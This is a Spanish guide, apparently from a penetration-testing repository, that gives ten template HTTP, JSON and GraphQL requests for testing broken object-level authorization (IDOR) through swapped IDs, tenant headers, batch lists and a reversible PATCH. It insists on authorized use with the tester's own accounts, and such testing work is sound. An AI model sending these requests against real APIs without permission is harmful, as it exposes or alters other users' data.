# 🗡️ BOLA: autorización rota por objeto: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. ID en path

**Objetivo:** A solicita objeto creado por B de prueba.

```http
GET /api/v1/orders/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Confirmar que el cuerpo contiene un dato privado de B; status 200 genérico no basta.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 2. ID en query

**Objetivo:** Probar la misma política cuando el ID viaja como parámetro.

```http
GET /api/v1/orders?id={ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar con ID propio y con ID inexistente para descartar fallback.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References).

### 3. ID en body

**Objetivo:** Verificar política de un resolver de lectura POST.

```json
{"orderId":"{ID_CONTROLADO_B}","include":"summary"}
```

**Interpretación:** Mantener token A y cuerpo idéntico salvo ID; usar datos de dos cuentas propias.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 4. Objeto hijo

**Objetivo:** Comprobar que autorización del padre cubre al hijo.

```http
GET /api/v1/projects/{PROYECTO_PROPIO}/files/{ARCHIVO_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** El archivo de B debe denegarse aunque el proyecto de A exista; adaptar relación real.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control/idor).

### 5. Batch mixto

**Objetivo:** Comprobar autorización por cada elemento de una lista.

```json
{"ids":["{ID_PROPIO}","{ID_CONTROLADO_B}"]}
```

**Interpretación:** La respuesta no debe filtrar el elemento B por estar junto al A.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 6. Descarga por identificador

**Objetivo:** Comparar política del endpoint de archivos.

```http
GET /api/v1/documents/{ID_CONTROLADO_B}/download HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** No descargar documentos ajenos; B debe crear el canary de prueba.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References).

### 7. Método PATCH reversible

**Objetivo:** Verificar escritura sobre objeto B sin afectarlo de forma irreversible.

```http
PATCH /api/v1/objects/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"label":"canary-{NONCE}"}
```

**Interpretación:** B confirma estado antes/después y restaura etiqueta; requiere permiso explícito para cambios.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 8. UUID conocido

**Objetivo:** Recordar que un identificador no secuencial no reemplaza autorización.

```http
GET /api/v1/objects/{UUID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Usar UUID de la cuenta B de prueba; nunca enumerar UUIDs de terceros.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 9. Tenant en cabecera

**Objetivo:** Comprobar que el tenant no se elige solo con input cliente.

```http
GET /api/v1/objects/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
X-Tenant-ID: {TENANT_B}
```

**Interpretación:** Debe vincularse al token y política servidor. Diferencia de error no equivale a lectura.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 10. GraphQL node

**Objetivo:** Probar el mismo objeto por otra superficie.

```json
{"query":"query($id:ID!){node(id:$id){id}}","variables":{"id":"{ID_CONTROLADO_B}"}}
```

**Interpretación:** Comprobar autorización en el resolver aunque REST esté protegido.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
